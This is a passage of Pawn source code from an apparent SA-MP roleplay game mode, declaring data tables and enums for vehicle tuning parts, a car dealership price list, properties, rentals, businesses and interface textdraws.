	robbingATM[ MAX_PLAYERS ];

//================================[ Tuning ]==================================//

enum PaintjobInfi 
{
	vehID,
	pNumber,
	pPrice,
	pNameBre[ 12 ]
};

const NUMBER_TYPE_PAINTJOB = 36;
static const pjInfo[ NUMBER_TYPE_PAINTJOB ][ PaintjobInfi ] = 
{
	{ 483, 0, 1000, "Paintjob 1" },
	{ 534, 0, 1000, "Paintjob 1" },
	{ 534, 1, 1000, "Paintjob 2" },
	{ 534, 2, 1000, "Paintjob 3" },
	{ 535, 0, 1000, "Paintjob 1" },
	{ 535, 1, 1000, "Paintjob 2" },
	{ 535, 2, 1000, "Paintjob 3" },
	{ 536, 0, 1000, "Paintjob 1" },
	{ 536, 1, 1000, "Paintjob 2" },
	{ 536, 2, 1000, "Paintjob 3" },
	{ 558, 0, 1000, "Paintjob 1" },
	{ 558, 1, 1000, "Paintjob 2" },
	{ 558, 2, 1000, "Paintjob 3" },
	{ 559, 0, 1000, "Paintjob 1" },
	{ 559, 1, 1000, "Paintjob 2" },
	{ 559, 2, 1000, "Paintjob 3" },
	{ 560, 0, 1000, "Paintjob 1" },
	{ 560, 1, 1000, "Paintjob 2" },
	{ 560, 2, 1000, "Paintjob 3" },
	{ 561, 0, 1000, "Paintjob 1" },
	{ 561, 1, 1000, "Paintjob 2" },
	{ 561, 2, 1000, "Paintjob 3" },
	{ 562, 0, 1000, "Paintjob 1" },
	{ 562, 1, 1000, "Paintjob 2" },
	{ 562, 2, 1000, "Paintjob 3" },
	{ 565, 0, 1000, "Paintjob 1" },
	{ 565, 1, 1000, "Paintjob 2" },
	{ 565, 2, 1000, "Paintjob 3" },
	{ 567, 0, 1000, "Paintjob 1" },
	{ 567, 1, 1000, "Paintjob 2" },
	{ 567, 2, 1000, "Paintjob 3" },
	{ 575, 0, 1000, "Paintjob 1" },
	{ 575, 1, 1000, "Paintjob 2" },
	{ 576, 0, 1000, "Paintjob 1" },
	{ 576, 1, 1000, "Paintjob 2" },
	{ 576, 2, 1000, "Paintjob 3" }
};

enum ComponentsInfo {
	cID,
	cName[ 40 ],
	cPrice,
	cType
};

const MAX_COMPONENTS = 194;
static const cInfo[ MAX_COMPONENTS ][ ComponentsInfo ] = {
	{ 1000, "Pro Spoiler", 2000, CARMODTYPE_SPOILER },
	{ 1001, "Win Spoiler", 2100, CARMODTYPE_SPOILER },
	{ 1002, "Drag Spoiler", 2200, CARMODTYPE_SPOILER },
	{ 1003, "Alpha Spoiler", 2300, CARMODTYPE_SPOILER },
	{ 1004, "Champ Scoop Hood", 1600, CARMODTYPE_HOOD },
	{ 1005, "Fury Scoop Hood", 1800, CARMODTYPE_HOOD },
	{ 1006, "Roof Scoop Roof", 2200, CARMODTYPE_ROOF },
	{ 1007, "Right Sideskirt", 1500, CARMODTYPE_SIDESKIRT },
	{ 1009, "2x Nitrous", 1000, CARMODTYPE_NITRO },
	{ 1008, "5x Nitrous", 4000, CARMODTYPE_NITRO },
	{ 1010, "10x Nitrous", 8000, CARMODTYPE_NITRO },
	{ 1011, "Race Scoop Hood", 1000, CARMODTYPE_HOOD },
	{ 1012, "Worx Scoop Hood", 1100, CARMODTYPE_HOOD },
	{ 1013, "Round Fog Lamp", 1200, CARMODTYPE_LAMPS },
	{ 1014, "Champ Spoiler", 2000, CARMODTYPE_SPOILER },
	{ 1015, "Race Spoiler", 2200, CARMODTYPE_SPOILER },
	{ 1016, "Worx Spoiler", 2400, CARMODTYPE_SPOILER },
	{ 1017, "Left Sideskirt", 1500, CARMODTYPE_SIDESKIRT },
	{ 1018, "Upswept Exhaust", 2000, CARMODTYPE_EXHAUST },
	{ 1019, "Twin Exhaust", 2200, CARMODTYPE_EXHAUST },
	{ 1020, "Large Exhaust", 2400, CARMODTYPE_EXHAUST },
	{ 1021, "Medium Exhaust", 2600, CARMODTYPE_EXHAUST },
	{ 1022, "Small Exhaust", 2500, CARMODTYPE_EXHAUST },
	{ 1023, "Fury Spoiler", 2450, CARMODTYPE_SPOILER },
	{ 1024, "Square Fog Lamp", 1200, CARMODTYPE_LAMPS },
	{ 1025, "Offroad Wheels", 4000, CARMODTYPE_WHEELS },
	{ 1026, "Right Alien Sideskirt", 2500, CARMODTYPE_SIDESKIRT },
	{ 1027, "Left Alien Sideskirt", 2500, CARMODTYPE_SIDESKIRT },
	{ 1028, "Alien Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1029, "X-Flow Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1030, "Left X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1031, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1032, "Alien Roof Vent", 2000, CARMODTYPE_ROOF },
	{ 1033, "X-Flow Roof Vent", 2000, CARMODTYPE_ROOF },
	{ 1034, "Alien Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1035, "X-Flow Roof Vent", 2000, CARMODTYPE_ROOF },
	{ 1036, "Right Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1037, "X-Flow Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1038, "Alien Roof Vent", 2000, CARMODTYPE_ROOF },
	{ 1039, "Left X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1040, "Left Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1041, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1042, "Right Chrome Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1043, "Slamin Exhaust", 2000, CARMODTYPE_EXHAUST },
	{ 1044, "Chrome Exhaust", 2000, CARMODTYPE_EXHAUST },
	{ 1045, "X-Flow Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1046, "Alien Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1047, "Right Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1048, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1049, "Alien Spoiler", 5000, CARMODTYPE_SPOILER },
	{ 1050, "X-Flow Spoiler", 5000, CARMODTYPE_SPOILER },
	{ 1051, "Left Alien Sideskirt", 3000, CARMODTYPE_SPOILER },
	{ 1052, "Left X-Flow Sideskirt", 3000, CARMODTYPE_SPOILER },
	{ 1053, "X-Flow Roof", 2500, CARMODTYPE_ROOF },
	{ 1054, "Alien Roof", 2500, CARMODTYPE_ROOF },
	{ 1055, "Alien Roof", 2500, CARMODTYPE_ROOF },
	{ 1056, "Right Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1057, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1058, "Alien Spoiler", 5000, CARMODTYPE_SPOILER },
	{ 1059, "X-Flow Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1060, "X-Flow Spoiler", 4000, CARMODTYPE_SPOILER },
	{ 1061, "X-Flow Roof", 2500, CARMODTYPE_ROOF },
	{ 1062, "Left Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1063, "Left X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1064, "Alien Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1065, "Alien Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1066, "X-Flow Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1067, "Alien Roof", 2500, CARMODTYPE_ROOF },
	{ 1068, "X-Flow Roof", 2500, CARMODTYPE_ROOF },
	{ 1069, "Right Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1070, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1071, "Left Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1072, "Left X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1073, "Shadow Wheels", 15000, CARMODTYPE_WHEELS },
	{ 1074, "Mega Wheels", 24000, CARMODTYPE_WHEELS },
	{ 1075, "Rimshine Wheels", 22000, CARMODTYPE_WHEELS },
	{ 1076, "Wires Wheels", 10000, CARMODTYPE_WHEELS },
	{ 1077, "Classic Wheels", 11000, CARMODTYPE_WHEELS },
	{ 1078, "Twist Wheels", 10500, CARMODTYPE_WHEELS },
	{ 1079, "Cutter Wheels", 13000, CARMODTYPE_WHEELS },
	{ 1080, "Switch Wheels", 50000, CARMODTYPE_WHEELS },
	{ 1081, "Grove Wheels", 8000, CARMODTYPE_WHEELS },
	{ 1082, "Import Wheels", 23000, CARMODTYPE_WHEELS },
	{ 1083, "Dollar Wheels", 18000, CARMODTYPE_WHEELS },
	{ 1084, "Trance Wheels", 14000, CARMODTYPE_WHEELS },
	{ 1085, "Atomic Wheels", 22000, CARMODTYPE_WHEELS },
	{ 1086, "Stereo Wheels", 13000, CARMODTYPE_STEREO },
	{ 1087, "Hydraulics", 10000, CARMODTYPE_HYDRAULICS },
	{ 1088, "Alien Roof", 2500, CARMODTYPE_ROOF },
	{ 1089, "X-Flow Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1090, "Right Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1091, "X-Flow Roof", 2500, CARMODTYPE_ROOF },
	{ 1092, "Alien Exhaust", 4000, CARMODTYPE_EXHAUST },
	{ 1093, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1094, "Left Alien Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1095, "Right X-Flow Sideskirt", 3000, CARMODTYPE_SIDESKIRT },
	{ 1096, "Ahab Wheels", 14000, CARMODTYPE_WHEELS },
	{ 1097, "Virtual Wheels", 13000, CARMODTYPE_WHEELS },
	{ 1098, "Access Wheels", 13000, CARMODTYPE_WHEELS },
	{ 1099, "Left Chrome Sideskirt", 2000, CARMODTYPE_SIDESKIRT },
	{ 1100, "Chrome Grill", 1000, -1 }, // Bullbar
	{ 1101, "Left `Chrome Flames` Sideskirt", 1500, CARMODTYPE_SIDESKIRT },
	{ 1102, "Left `Chrome Strip` Sideskirt", 1500, CARMODTYPE_SIDESKIRT },
	{ 1103, "Covertible Roof", 4000, CARMODTYPE_ROOF },
	{ 1104, "Chrome Exhaust", 3000, CARMODTYPE_EXHAUST },
	{ 1105, "Slamin Exhaust", 3000, CARMODTYPE_EXHAUST },
	{ 1106, "Right `Chrome Arches`", 2000, CARMODTYPE_SIDESKIRT },
	{ 1107, "Left `Chrome Strip` Sideskirt", 2000, CARMODTYPE_SIDESKIRT },
	{ 1108, "Right `Chrome Strip` Sideskirt", 2000, CARMODTYPE_SIDESKIRT },
	{ 1109, "Chrome", 2000, -1 }, // Bullbar
	{ 1110, "Slamin", 2000, -1 }, // Bullbar
	{ 1111, "Little Sign?", 1000, -1 }, // sig
	{ 1112, "Little Sign?", 1000, -1 }, // sig
	{ 1113, "Chrome Exhaust", 2000, CARMODTYPE_EXHAUST },
	{ 1114, "Slamin Exhaust", 2000, CARMODTYPE_EXHAUST },
	{ 1115, "Chrome", 2000, -1 }, // Bullbar
	{ 1116, "Slamin", 2000, -1 }, // Bullbar
	{ 1117, "Chrome Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1118, "Right `Chrome Trim` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1119, "Right `Wheelcovers` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1120, "Left `Chrome Trim` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1121, "Left `Wheelcovers` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1122, "Right `Chrome Flames` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1123, "Bullbar Chrome Bars", 1000, -1 }, // Bullbar
	{ 1124, "Left `Chrome Arches` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1125, "Bullbar Chrome Lights", 1000, -1 }, // Bullbar
	{ 1126, "Chrome Exhaust", 1000, CARMODTYPE_EXHAUST },
	{ 1127, "Slamin Exhaust", 1000, CARMODTYPE_EXHAUST },
	{ 1128, "Vinyl Hardtop", 1000, CARMODTYPE_ROOF },
	{ 1129, "Chrome Exhaust", 1000, CARMODTYPE_EXHAUST },
	{ 1130, "Hardtop Roof", 4000, CARMODTYPE_ROOF },
	{ 1131, "Softtop Roof", 4000, CARMODTYPE_ROOF },
	{ 1132, "Slamin Exhaust", 1000, CARMODTYPE_EXHAUST },
	{ 1133, "Right `Chrome Strip` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1134, "Right `Chrome Strip` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1135, "Slamin Exhaust", 1000, CARMODTYPE_EXHAUST },
	{ 1136, "Chrome Exhaust", 1000, CARMODTYPE_EXHAUST },
	{ 1137, "Left `Chrome Strip` Sideskirt", 1000, CARMODTYPE_SIDESKIRT },
	{ 1138, "Alien Spoiler", 5000, CARMODTYPE_SPOILER },
	{ 1139, "X-Flow Spoiler", 5000, CARMODTYPE_SPOILER },
	{ 1140, "X-Flow Rear Bumper", 2000, CARMODTYPE_REAR_BUMPER },
	{ 1141, "Alien Rear Bumper", 2000, CARMODTYPE_REAR_BUMPER },
	{ 1142, "Left Oval Vents", 1000, CARMODTYPE_VENT_LEFT },
	{ 1143, "Right Oval Vents", 1000, CARMODTYPE_VENT_RIGHT },
	{ 1144, "Left Square Vents", 1000, CARMODTYPE_VENT_LEFT },
	{ 1145, "Right Square Vents", 1000, CARMODTYPE_VENT_RIGHT },
	{ 1146, "X-Flow Spoiler", 4500, CARMODTYPE_SPOILER },
	{ 1147, "Alien Spoiler", 4500, CARMODTYPE_SPOILER },
	{ 1148, "X-Flow Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1149, "Alien Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1150, "Alien Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1151, "X-Flow Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1152, "X-Flow Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1153, "Alien Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1154, "Alien Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1155, "Alien Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1156, "X-Flow Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1157, "X-Flow Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1158, "X-Flow Spoiler", 4500, CARMODTYPE_SPOILER },
	{ 1159, "Alien Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1160, "Alien Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1161, "X-Flow Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1162, "Alien Spoiler", 4500, CARMODTYPE_SPOILER },
	{ 1163, "X-Flow Spoiler", 4500, CARMODTYPE_SPOILER },
	{ 1164, "Alien Spoiler", 4500, CARMODTYPE_SPOILER },
	{ 1165, "X-Flow Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1166, "Alien Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1167, "X-Flow Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1168, "Alien Rear Bumper", 4500, CARMODTYPE_REAR_BUMPER },
	{ 1169, "Alien Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1170, "X-Flow Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1171, "Alien Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1172, "X-Flow Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1173, "X-Flow Front Bumper", 4500, CARMODTYPE_FRONT_BUMPER },
	{ 1174, "Chrome Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1175, "Slamin Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1176, "Chrome Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1177, "Slamin Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1178, "Slamin Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1179, "Chrome Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1180, "Chrome Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1181, "Slamin Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1182, "Chrome Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1183, "Slamin Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1184, "Chrome Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1185, "Slamin Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1186, "Slamin Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1187, "Chrome Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1188, "Slamin Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1189, "Chrome Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1190, "Slamin Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1191, "Chrome Front Bumper", 1000, CARMODTYPE_FRONT_BUMPER },
	{ 1192, "Chrome Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER },
	{ 1193, "Slamin Rear Bumper", 1000, CARMODTYPE_REAR_BUMPER }
};

enum tpi {
	tID,
	tType,
	bool:tPaintjob,
	PJColor[ 2 ]
};
new TPInfo[ MAX_PLAYERS ][ tpi ];

//============================[ Oruzje Dropano ]==============================//

const MAX_GOBJ = 1000;
enum dGunEnum 
{
	Float:ObjPos[ 3 ],
	gObjID,
	ObjData[ 2 ]
};
new dGunData[ MAX_GOBJ ][ dGunEnum ];

//================================[ Vozila ]==================================//

enum 
{
	PRIVATNO_VOZILO = 1,
	ORGANIZACIJSKO_VOZILO,
	IZLOZBENO_VOZILO
};

enum vVoziloInfo 
{
	vSqlID,
	vOwner_sqlID,
	vPrice,
	vOwner[ MAX_PLAYER_NAME ],
	vLocked,
	Float:vLokacijaX,
	Float:vLokacijaY,
	Float:vLokacijaZ,
	Float:vLokacijaA,
	vVirtualWorld,
	vInterior,
	vUsage,
	vOrganizationSQLID,
	vOrganization,
	vColor1,
	vColor2,
	vModel,
	vTeh,
	vReg,
	vRegVreme,
	vTablice[ 16 ],
	vOsiguranje,
	vLock,
	vAlarm,
 	vNeon,
	vTuned,
 	vImobilizator,
	vSpoiler,
	vHood,
	vRoof,
	vSkirt,
	vLamps,
	vNitro,
	vExhaust,
	vWheels,
	vStereo,
	vHydraulics,
	vFrontBumper,
	vRearBumper,
	vVents,
	vPaintJob,
	vDrugAmmount,
	vMaterijali,
	vMelee,
	vWeap1,
	vAmmo1,
	vWeap2,
	vAmmo2,
	vKilometri,
	vMetri,
	v_owner_id,
	bool:Validv3DText,
	Text3D:v3DText
}
new VehicleInfo[ MAX_VEHICLES ][ vVoziloInfo ];

//===============================[ Imovina ]==================================//

const MAX_IMOVINA =													      1000;

enum 
{
	IMOVINA_KUCA = 1,
	IMOVINA_STAN,
	IMOVINA_VIKENDICA
};

enum 
{
	MALA_KUCA = 1,
	SREDNJA_KUCA,
	VELIKA_KUCA
};

const Float:MALA_KUCA_X =											 -2169.9707;
const Float:MALA_KUCA_Y =                                            -2135.9546;
const Float:MALA_KUCA_Z =                                             1501.1005;
const MALA_KUCA_PRICE = 												 500000;
const MALA_KUCA_INT = 														  8;

const Float:SREDNJA_KUCA_X =                                          2180.9473;
const Float:SREDNJA_KUCA_Y =                                          -567.4002;
const Float:SREDNJA_KUCA_Z =                                          1502.0050;
const SREDNJA_KUCA_PRICE = 												 750000;
const SREDNJA_KUCA_INT = 													 12;

const Float:VELIKA_KUCA_X =                                          -1036.5311;
const Float:VELIKA_KUCA_Y =                                          -2205.9390;
const Float:VELIKA_KUCA_Z =											  1501.0859;
const VELIKA_KUCA_PRICE = 												1000000;
const VELIKA_KUCA_INT = 												      7;

const Float:STAN_X =                                                  1281.0326;
const Float:STAN_Y =                                                   -36.3996;
const Float:STAN_Z =                                                  1000.9205;
const STAN_PRICE = 														 350000;
const STAN_INT = 															  5;

const Float:VIKENDICA_X =                                             -407.3531;
const Float:VIKENDICA_Y =                                            -2086.5007;
const Float:VIKENDICA_Z =                                             1501.0964;
const VIKENDICA_PRICE = 												 300000;
const VIKENDICA_INT =	 													  7;

//-- Glavno

enum Imovina 
{
	iSQLID,
	iOwnerSQLID,
	iOwned,
	bool:iOnAuction,
	iOwner[ MAX_PLAYER_NAME ],
	iUsage,
	Float:iEnter[ 3 ],
	Float:iExit[ 3 ],
	iPrice,
    iLocked,
	iInterior,
	iVW,
	iVrsta,
	iOruzje[ 4 ],
	iMunicija[ 4 ],
	iDrugAmmount,
	iDoorLevel,
	iAlarm,
	iLockLevel,
	iTime,
	iLevel,
	iAdress[ 49 ],
	iNeaktivnost,
	iRentable,
	iRentPrice,
	iRentovano,
	iMats,
	iMoney
};
new II[ MAX_IMOVINA ][ Imovina ],
	Iterator:iter_Imovina<MAX_IMOVINA>,
	ImovinaPickup[ MAX_IMOVINA ],
	Text3D:ImovinaLabel[ MAX_IMOVINA ];

//=================================[ Rent ]===================================//

const MAX_VRENT = 21;
enum vrentbolan 
{
	vrSQLID,
	//
	Float:vrLiP_Pos_X,
	Float:vrLiP_Pos_Y,
	Float:vrLiP_Pos_Z,
	Float:vrSpawn_Pos_X,
	Float:vrSpawn_Pos_Y,
	Float:vrSpawn_Pos_Z,
	Float:vrSpawn_Pos_A,
	//
	Text3D:VoziloRentLabel,
	VoziloRentPickup
}
new VoziloRentInfo[MAX_VRENT][vrentbolan],
	Iterator:iter_Rent<MAX_VRENT>;

//================================[ Salon ]==================================//

new bool:as_Buying[MAX_PLAYERS],
	as_Model[MAX_PLAYERS];

enum e_salonvozila
{
	vID,
	vName[20],
	vPrice
}
static const SalonVozila[][e_salonvozila] =
{
	{400, "Landstalker", 300000},
	{401, "Bravura", 180000},
	{402, "Buffalo", 700000},
	{404, "Perenniel", 110000},
	{405, "Sentinel", 160000},
	{410, "Manana", 145000},
	{411, "Infernus", 1700000},
	{412, "Voodoo", 120000},
	{413, "Pony", 210000},
	{415, "Cheetah", 1200000},
	{418, "Moonbeam", 230000},
	{419, "Esperanto", 120000},
	{421, "Washington", 225000},
	{422, "Bobcat", 170000},
	{426, "Premier", 320000},
	{429, "Banshee", 1000000},
	{436, "Previon", 110000},
	{439, "Stallion", 270000},
	{445, "Admiral", 310000},
	{446, "Squallo", 600000},
	{451, "Turismo", 1400000},
	{452, "Speeder", 450000},
	{453, "Reefer", 220000},
	{454, "Tropic", 800000},
	{458, "Solair", 205000},
	{460, "Skimmer", 640000},
	{461, "PCJ-600", 650000},
	{462, "Faggio", 190000},
	{463, "Freeway", 350000},
	{466, "Glendale", 100000},
	{467, "Oceanic", 100000},
	{468, "Sanchez", 800000},
	{469, "Sparrow", 590000},
	{471, "Quad", 290000},
	{473, "Dinghy", 170000},
	{474, "Hermes", 110000},
	{475, "Sabre", 600000},
	{477, "ZR-350", 620000},
	{479, "Regina", 165000},
	{480, "Comet", 620000},
	{481, "BMX", 30000},
	{482, "Burrito", 250000},
	{483, "Camper", 215000},
	{484, "Marquis", 505000},
	{487, "Maverick", 950000},
	{489, "Rancher", 410000},
	{491, "Virgo", 195000},
	{492, "Greenwood", 205000},
	{493, "Jetmax", 405000},
	{496, "Blista Compact", 245000},
	{500, "Mesa", 315000},
	{506, "Super GT", 500000},
	{507, "Elegant", 280000},
	{509, "Bike", 40000},
	{510, "Mountain Bike", 50000},
	{513, "Stuntplane", 515000},
	{517, "Majestic", 250000},
	{518, "Buccaneer", 185000},
	{519, "Shamal", 3000000},
	{521, "FCR-900", 1200000},
	{522, "NRG-500", 2500000},
	{526, "Fortune", 335000},
	{527, "Cadrona", 215000},
	{529, "Willard", 200000},
	{533, "Feltzer", 240000},
	{534, "Remington", 185000},
	{535, "Slamvan", 225000},
	{536, "Blade", 220000},
	{540, "Vincent", 420000},
	{541, "Bullet", 1500000},
	{542, "Clover", 205000},
	{543, "Sadler", 195000},
	{545, "Hustler", 530000},
	{546, "Intruder", 210000},
	{547, "Primo", 215000},
	{549, "Tampa", 280000},
	{550, "Sunrise", 390000},
	{551, "Merit", 340000},
	{554, "Yosemite", 570000},
	{555, "Windsor", 370000},
	{558, "Uranus", 600000},
	{559, "Jester", 800000},
	{560, "Sultan", 1700000},
	{561, "Stratum", 585000},
	{562, "Elegy", 1200000},
	{565, "Flash", 540000},
	{566, "Tahoma", 205000},
	{567, "Savanna", 225000},
	{575, "Broadway", 385000},
	{576, "Tornado", 195000},
	{579, "Huntley", 2000000},
	{580, "Stafford", 440000},
	{581, "BF-400", 580000},
	{585, "Emperor", 210000},
	{586, "Wayfarer", 400000},
	{587, "Euros", 600000},
	{589, "Club", 700000},
	{600, "Picador", 305000},
	{602, "Alpha", 405000},
	{603, "Phoenix", 800000}
};

//=================================[ Firme ]==================================//

const MAX_BUSSINES = 50;
const FIRMA_ZARADA = 70;
enum 
{
	VRSTA_MARKET = 1,
	VRSTA_nema, //unused
	VRSTA_BURG,
	VRSTA_CLUCK,
	VRSTA_BINCO,
	VRSTA_ZIP,
	VRSTA_VICTIM,
	VRSTA_SUBURBAN,
	VRSTA_GUNSHOP,
	VRSTA_GYM,
	VRSTA_BAR,
	VRSTA_RESTORAN,
	VRSTA_PIZZA,
	VRSTA_NKLUB,
	VRSTA_DISCO,
	VRSTA_ELEKTRONIK,
	VRSTA_TRAFIKA,
	VRSTA_POSAO,
	VRSTA_RENT,
	VRSTA_nema2, //unused
	VRSTA_JAVNAK,
	VRSTA_KLAD,
	VRSTA_OGLAS,
	VRSTA_nema4, //unused
	VRSTA_nema3, //unused
	VRSTA_nema5, //unused
	VRSTA_nema6, //unused
	VRSTA_nema7, //unused
	VRSTA_LUTRIJA,
	VRSTA_CASINO
};

enum kladjenje
{
	bool:IgraRulet,
	UlogRulet,
	BrojRulet,
	//
	bool:IgraKlad,
	UlogKlad,
	TimKlad
}
new Kockanje[MAX_PLAYERS][kladjenje];

enum fInformacije 
{
    b_ID,
    bOwner_sqlID,
    bool:bOnAuction,
    bOwner[ MAX_PLAYER_NAME ],
    bPrice,
    bType,
    bLocked,
    bMoney,
    Float:bEnterX,
    Float:bEnterY,
    Float:bEnterZ,
    Float:bExitX,
    Float:bExitY,
    Float:bExitZ,
    bInt,
    bVW,
    bInInt,
    bInVW,
    bName[ 64 ],
    bLevel,
    bJobID,
    bNeaktivnost,
    bFacture,
    bOwnerOrg
}
new BusinessInfo[ MAX_BUSSINES ][ fInformacije ],
	Iterator:iter_Bizz<MAX_BUSSINES>,
	FirmaPickup[ MAX_BUSSINES ],
	Text3D:FirmaLabel[ MAX_BUSSINES ];

//==================================[ Area ]====================================

#if ZIMSKI_MOD == 1
new Area_Grudvanje,
	Area_Klizaliste;
#endif

new bankaSalter;

//=================================[ Script ]=================================//

#define IPI                     	INVALID_PLAYER_ID
#define IVI                      	INVALID_VEHICLE_ID

#define SendErrorMessage(%0,%1) 	SCMF(%0, 0xFF0000FF, "(GRESKA): "%1)
#define SendJobMessage(%0,%1) 		SCMF(%0, 0x36AB00FF, "(POSAO): "%1)
#define SendInfoMessage(%0,%1) 		SCMF(%0, 0x4282C0FF, "(INFO): "%1)
#define SendUsageMessage(%0,%1) 	SCMF(%0, 0x0071B2FF, "(KOMANDA): {FFFFFF}"%1)

#define _:public%0(%1) 			forward%0(%1); public%0(%1)

//=================================[ Spawn ]==================================//

enum 
{
    SPAWN_OBICAN_LS_1 = 1,
	SPAWN_OBICAN_LS_2,
	//
	SPAWN_IMOVINA_1,
	SPAWN_IMOVINA_2,
	SPAWN_IMOVINA_3,
	//
	SPAWN_BAZA,
	SPAWN_ADMIN,
	//
	SPAWN_RENT
};

//==============================[ Textdraws ]=================================//

new PlayerText:ServerIntro_pTD[MAX_PLAYERS][19],
	PlayerText:Register_pTD[MAX_PLAYERS][33],
    PlayerText:Login_pTD[MAX_PLAYERS][19],
    	  Text:Ingame_gTD[5],
	PlayerText:Ingame_pTD[MAX_PLAYERS][41],
	PlayerText:Speedo_pTD[MAX_PLAYERS][9],
	PlayerText:TuningMenu_pTD[MAX_PLAYERS][10],
	PlayerText:SalonVozila_pTD[MAX_PLAYERS][12],
	PlayerText:Zauzimanje_pTD[MAX_PLAYERS][9],
	 PlayerBar:ZauzimanjeBar_pTD[MAX_PLAYERS] = { INVALID_PLAYER_BAR_ID, ... };

new 	  Text:TDM_gTD[21],
	PlayerText:TDMplayerScore_pTD[MAX_PLAYERS],
	PlayerText:tdm_player_tds[MAX_PLAYERS][49],
	PlayerText:WAR_pTD[MAX_PLAYERS][19];

new PlayerText:Police_TV[MAX_PLAYERS][14],
	PlayerText:BLOWJOBCOVER[MAX_PLAYERS][4];

new PlayerText:ATM_pTD[MAX_PLAYERS][19],
	PlayerText:ATMRobLoading_pTD[MAX_PLAYERS][2],
	 PlayerBar:ATMRobBar_pTD[MAX_PLAYERS] = { INVALID_PLAYER_BAR_ID, ... };

new PlayerText:SpecTextDraw[MAX_PLAYERS],
	PlayerText:WantedLevel_pTD[MAX_PLAYERS][2];

new PlayerText:PNamjestaj_pTD[MAX_PLAYERS][13],
	PlayerText:PNamjestajColor_pTD[MAX_PLAYERS][9];

